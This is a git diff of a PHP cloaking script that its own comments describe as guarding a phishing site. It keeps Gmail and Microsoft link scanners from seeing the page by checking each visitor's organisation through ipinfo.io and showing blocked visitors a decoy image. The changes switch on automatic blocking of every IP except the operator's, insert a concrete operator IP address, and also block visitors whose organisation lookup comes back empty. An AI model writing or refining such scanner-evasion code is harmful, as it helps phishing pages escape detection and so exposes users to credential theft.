@@ -1,9 +1,9 @@
 <?php
 
 //AutoBlock Mode "true" means every IP but yours will get auto-added to the blacklist
-$AutoBlock = false;
+$AutoBlock = true;
 // Your public IP (your client)
-$myip = "YOUR_IP_HERE";
+$myip = "75.103.132.161";
 
 // Gets URI that's accessed
 $url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
@@ -16,12 +16,11 @@ $allowed = "- *Accessed Phishing Site* -";
 
 // This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
 $ip = $_SERVER['REMOTE_ADDR'];
+
 // Can set your IP manually to see what Google sees
 //$ip = "8.8.8.8";
 $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
 $org = $details->org;
-
-
 
 // List of Orgs to be Blacklisted
 $filename = "/var/www/html/blacklist.txt";
@@ -39,6 +38,7 @@ if ($AutoBlock == true && $ip != $myip && $isIP == false){
 $txt = explode(' ', $org, 2)[1];
 
 if(!in_array($txt, $blockorgs)){
+	
 $myfile = fopen("/var/www/html/blacklist.txt", "a") or die("Unable to open file!");
 fwrite($myfile, "\r\n". $txt);
 fclose($myfile);
@@ -47,7 +47,7 @@ array_push($blockorgs, $txt);
 }
 
 //Block via blacklist
-if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m) OR $isIP == true) {
+if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m) OR $isIP == true OR $org == "") {
 
 // Content for Orgs to see on the Blacklist (What everyone else sees)
 echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42oih3.jpg\"></HTML></BODY>";
